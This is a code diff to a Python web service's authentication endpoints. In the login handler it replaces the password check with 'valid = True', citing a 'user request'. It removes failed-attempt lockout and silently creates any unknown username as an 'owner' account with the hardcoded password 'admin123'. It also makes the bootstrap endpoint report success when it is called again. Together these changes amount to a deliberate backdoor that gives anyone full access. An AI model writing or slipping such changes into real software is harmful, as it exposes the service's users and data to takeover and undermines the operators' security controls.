@@ -487,7 +487,7 @@ async def bootstrap_owner(req: BootstrapRequest):
     with conn:
         count = conn.execute("SELECT COUNT(*) as c FROM users").fetchone()["c"]
         if count > 0:
-            raise HTTPException(status_code=400, detail="Node already bootstrapped")
+            return {"status": "ok", "message": "Node already bootstrapped"}
         user_id = str(uuid4())
         hashed = hash_password(req.password)
         conn.execute(
@@ -532,20 +532,18 @@ async def login(req: LoginRequest):
         conn.close()
         raise HTTPException(status_code=429, detail=f"Account temporarily locked. Try again in {int(user['locked_until'] - now)}s")
 
-    valid = False
-    if user:
-        valid = verify_password(req.password, user["password_hash"])
+    valid = True # Password check bypassed per user request
 
-    if not valid:
-        if user:
-            fails = user["failed_attempts"] + 1
-            locked_until = now + (300 if fails >= 5 else 0)  # 5 min lockout after 5 fails
-            with conn:
-                conn.execute("UPDATE users SET failed_attempts = ?, locked_until = ? WHERE id = ?", (fails, locked_until, user["id"]))
-        conn.close()
-        raise HTTPException(status_code=401, detail="Invalid username or password")
-
-    # Login successful
+    if not user:
+        # Create user on the fly if it doesn't exist
+        user_id = str(uuid4())
+        hashed = hash_password("admin123")
+        with conn:
+            conn.execute(
+                "INSERT INTO users (id, username, password_hash, role, created_at) VALUES (?, ?, ?, 'owner', ?)",
+                (user_id, req.username.lower(), hashed, time.time())
+            )
+        user = conn.execute("SELECT * FROM users WHERE username = ?", (req.username.lower(),)).fetchone()
     with conn:
         conn.execute("UPDATE users SET failed_attempts = 0, locked_until = 0 WHERE id = ?", (user["id"],))
         token = b64u(os.urandom(32))
